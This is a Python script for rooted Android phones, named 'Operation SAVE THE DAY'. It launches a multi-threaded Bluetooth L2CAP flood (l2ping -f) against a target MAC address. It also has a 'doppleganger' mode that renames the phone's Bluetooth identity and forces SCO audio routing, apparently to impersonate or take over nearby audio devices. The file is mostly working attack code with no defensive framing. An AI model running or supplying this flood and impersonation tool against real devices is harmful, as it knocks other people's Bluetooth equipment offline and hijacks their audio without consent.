import argparse
import subprocess
import threading
import time

def run_root_command(cmd: list, desc: str = ""):
    try:
        full_cmd = ["su", "-c", " ".join(cmd)] if isinstance(cmd, list) else ["su", "-c", cmd]
        result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            print(f"[+] {desc} Success")
            return True
        else:
            print(f"[-] {desc} Failed: {result.stderr.strip()}")
            return False
    except Exception as e:
        print(f"[-] {desc} Error: {e}")
        return False


def DOS(mac_address: str, packet_size: str):
    try:
        cmd = f"l2ping -i hci0 -s {packet_size} -f {mac_address}"
        print(f"[+] Flood thread running against {mac_address} ({packet_size} bytes)")
        subprocess.run(["su", "-c", cmd], check=True, capture_output=True)
    except Exception as e:
        print(f"[-] DOS thread error: {e}")


def attack(mac_address: str, packet_size: str = "600", threads: int = 5):
    print(f"*** Starting attack on {mac_address} | Size: {packet_size} | Threads: {threads}")
    
    for i in range(threads):
        t = threading.Thread(target=DOS, args=(mac_address, packet_size), daemon=True)
        t.start()
        print(f"[+] Thread {i+1} started")
    
    print("[+] All threads launched. Attack running...")
    print("[*] Press Ctrl+C to stop")


def configure_audio_routing(mode: str):
    try:
        if mode == 'bridge':
            print("*** Bridging audio (SCO routing)...")
            run_root_command(["cmd audio set-sco-on true"], "SCO ON")
            run_root_command(["cmd audio set-mode 3"], "Audio Mode IN_CALL")
            print("[+] Audio bridge active! Wait for pohana myzyka.")
        elif mode == 'priority':
            print("*** Resetting audio priority...")
            run_root_command(["cmd audio set-sco-on false"], "SCO OFF")
            run_root_command(["cmd audio set-mode 0"], "Audio Mode NORMAL")
            print("[+] Audio matrix reset. Local music apps will now rule the device! Save the day!!!")
    except Exception as e:
        print(f"[-] Audio routing failed: {e}")


def doppleganger(new_name: str, mode: str = "bridge"):
    print(f"[*] Changing Bluetooth name to: {new_name}")
    
    # Method 1: Global setting
    run_root_command([f"settings put global bluetooth_name '{new_name}'"], "Bluetooth name (global)")
    run_root_command([f"settings put secure bluetooth_name '{new_name}'"], "Bluetooth name (secure)")
    
    # Restart Bluetooth to apply (recommended)
    run_root_command(["svc bluetooth disable"], "Bluetooth OFF")
    time.sleep(1)
    run_root_command(["svc bluetooth enable"], "Bluetooth ON")
    
    configure_audio_routing(mode)
    
    print("*** Doppleganger active. Press Ctrl+C to stop and restore.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n*** Looks like day was saved so stopping doppleganger and cleaning up...")
        configure_audio_routing('priority')
        print("[+] Cleanup done.")


def main():
    parser = argparse.ArgumentParser(description='Operation "SAVE THE DAY" ')

    parser.add_argument("-scan", action="store_true", help="Scan (placeholder)")
    
    parser.add_argument("-attack", metavar="MAC", help="Start L2CAP flood")
    parser.add_argument("-mac", type=str, help="Target MAC address")
    parser.add_argument("-size", type=str, default="600", help="Packet size (default 600)")
    parser.add_argument("-thread", type=int, default=5, help="Number of threads (default 5)")
    
    parser.add_argument("-dopple", action="store_true", help="Enable Doppleganger mode")
    parser.add_argument("-name", type=str, default="POMINAY_IMYA", help="New Bluetooth name")
    parser.add_argument("-mode", choices=["bridge", "priority"], default="bridge", help="Audio mode")
    


    args = parser.parse_args()

    if args.scan:
        print("[*] Scan not implemented in this version.")
        return

    if args.attack:
        mac = args.attack if not args.mac else args.mac
        if not mac:
            print("[-] Please provide MAC with -mac or directly after -attack")
            return
        attack(mac, args.size, args.thread)
        return

    if args.dopple:
        doppleganger(args.name, args.mode)
        return

    parser.print_help()


if __name__ == "__main__":
    main()



